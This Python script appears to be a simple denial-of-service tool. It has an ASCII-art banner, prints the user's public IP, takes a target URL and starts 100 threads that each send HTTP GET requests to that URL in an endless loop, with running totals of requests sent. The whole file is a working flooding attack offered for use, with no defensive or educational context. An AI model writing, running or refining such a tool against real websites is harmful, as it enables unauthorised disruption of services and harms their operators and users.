import requests
import threading
import os
sent_requests = {}  
def ddos(url):
    global sent_requests
    s = 0
    while True:
        resddos = requests.get(url)
        s += 1
        sent_requests[threading.current_thread().name] = s  
        print(f"[{threading.current_thread().name}] sent: {s}, total sent: {sum(sent_requests.values())} status code: ",resddos.status_code)

threads = []
os.system('cls')
print('\033[95m' + """                                                                                                                                                                                                                                                         
            ,----.                                                                                     ,---,                       
           /   /  \-.   ,---.           ,--,                    ,----,            __  ,-.            ,---.'|   ,---.               
  .--.--. |   :    :|  '   ,'\        ,'_ /|  ,--,  ,--,      .'   .`|          ,' ,'/ /|            |   | :  '   ,'\   .--.--.    
 /  /    '|   | .\  . /   /   |  .--. |  | :  |'. \/ .`|   .'   .'  .'   ,---.  '  | |' |            |   | | /   /   | /  /    '   
|  :  /`./.   ; |:  |.   ; ,. :,'_ /| :  . |  '  \/  / ; ,---, '   ./   /     \ |  |   ,'          ,--.__| |.   ; ,. :|  :  /`./   
|  :  ;_  '   .  \  |'   | |: :|  ' | |  . .   \  \.' /  ;   | .'  /   /    /  |'  :  /           /   ,'   |'   | |: :|  :  ;_     
 \  \    `.\   `.   |'   | .; :|  | ' |  | |    \  ;  ;  `---' /  ;--,.    ' / ||  | '           .   '  /  |'   | .; : \  \    `.  
  `----.   \`--'""| ||   :    |:  | : ;  ; |   / \  \  \   /  /  / .`|'   ;   /|;  : |           '   ; |:  ||   :    |  `----.   \ 
 /  /`--'  /  |   | | \   \  / '  :  `--'   \./__;   ;  \./__;     .' '   |  / ||  , ;           |   | '/  ' \   \  /  /  /`--'  / 
'--'.     /   |   | :  `----'  :  ,      .-./|   :/\  \ ;;   |  .'    |   :    | ---'            |   :    :|  `----'  '--'.     /  
  `--'---'    `---'.|           `--`----'    `---'  `--` `---'         \   \  /                   \   \  /              `--'---'   
                `---`                                                   `----'                     `----'                          
                                                                                                                                  """)
q = '\033[93m' + "["
sa = '\033[93m' + "]"
wa = '\033[91m' + ">>"

r_ip = requests.get("http://api.ipify.org/").text
print('\033[94m' + "your ip:",r_ip)
print('\033[94m' + """click Enter = stop attack
100 threads
attack url""")
url = input(f"""{q}{wa}{sa}""")

for i in range(100):
    thread = threading.Thread(target=ddos, args=(url,))
    thread.name = f"Thread-{i}"
    threads.append(thread)
    thread.start()
for thread in threads:
    thread.join()
for thread_name, sent_count in sent_requests.items():
    print(f"[{thread_name}] total sent: {sent_count}")
print("Total sent: ", sum(sent_requests.values()))